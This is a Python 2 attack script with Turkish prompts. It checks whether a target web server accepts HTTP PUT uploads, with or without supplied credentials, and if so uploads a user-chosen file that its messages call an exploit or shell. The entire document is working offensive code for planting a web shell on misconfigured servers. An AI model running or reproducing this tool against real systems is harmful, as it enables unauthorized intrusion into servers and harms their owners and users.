#!/usr/bin/python

import requests
import time
import random,string

url = raw_input("Enter target ip address : ")
port = raw_input("Enter target port number : ")
dizin = raw_input("Enter target directory : ")

tam_url = "http://"+str(url)+":"+str(port)+dizin

girdi = raw_input("Sistemde yetkilendirme sistemi var midir? (Y/N) :")

sayac = 0

if str(girdi) in "n" or str(girdi) in "N":
    a = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    c = ''.join(random.choice(a) for i in range(18))

    print("\n\n**************** SISTEM TEST EDILMEKTEDIR ************************\n\n")
    sayac = 0

    con = requests.put(tam_url + c, data="TEST")
    if str(con.status_code) in "201":
        print("\n\tSistem yukleme elverislidir.\n\n\n")
        sayac = 1
    else:
        print("\n\n\tSistem yuklemeye elverisli degildir.\n\n")

    if str(sayac) in "1":
        exploit = raw_input("Exploit yolunu belirtiniz : ")
        print("\n\n\tSisteme shell atilmaktadir , bekleyiniz \n\n")
        time.sleep(2)
        with open(exploit, 'rb') as data:
            conn = requests.put(tam_url + exploit, data=data)
            if str(conn.status_code) in "201":
                print("\n\tSisteme exploit basarili sekilde atilmistir.\n")



elif str(girdi) in "y" or str(girdi) in "Y":

    user1 = raw_input("Kullanici adinizi yaziniz : ")
    pass1 = raw_input("Sifrenizi giriniz : ")

    a = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    c = ''.join(random.choice(a) for i in range(18))

    print("\n\n**************** SISTEM TEST EDILMEKTEDIR ************************\n\n")
    sayac = 0

    con = requests.put(tam_url + c, data="TEST", auth=(user1, pass1))
    if str(con.status_code) in "201":
        print("\n\tSistem yukleme elverislidir.\n\n\n")
        sayac = 1
    else:
        print("\n\n\tSistem yuklemeye elverisli degildir.\n\n")

    if str(sayac) in "1":
        exploit = raw_input("Exploit yolunu belirtiniz : ")
        print("\n\n\tSisteme exploit atilmaktadir , bekleyiniz \n\n")
        time.sleep(1)
        with open(exploit, 'rb') as data:
            conn = requests.put(tam_url + exploit, data=data, auth=(user1, pass1))
            if str(conn.status_code) in "201":
                print("\n\tSisteme exploit basarili sekilde atilmistir.\n")

else:
    print("YANLIS BIR TUSA BASDINIZ !!! ")
